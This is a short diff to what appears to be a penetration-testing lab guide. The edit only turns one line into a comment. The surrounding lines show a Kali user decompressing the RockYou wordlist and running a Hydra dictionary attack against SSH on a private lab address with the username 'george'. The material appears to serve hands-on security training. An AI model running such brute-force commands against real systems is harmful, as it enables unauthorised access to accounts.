@@ -44,7 +44,7 @@ Lab 1 - Follow the steps outlined in this section to leverage a dictionary attac
 ># Decompress the RockYou wordlist (required before use)
 >kali@kali:~$ sudo gzip -d rockyou.txt.gz
 >
->Run Hydra to perform a dictionary attack against SSH on port 2222
+># Run Hydra to perform a dictionary attack against SSH on port 2222
 >kali@kali:~$ hydra -l george -P /usr/share/wordlists/rockyou.txt -s 2222 ssh://192.168.123.201
 >
 ># ========== Expected Result ==========
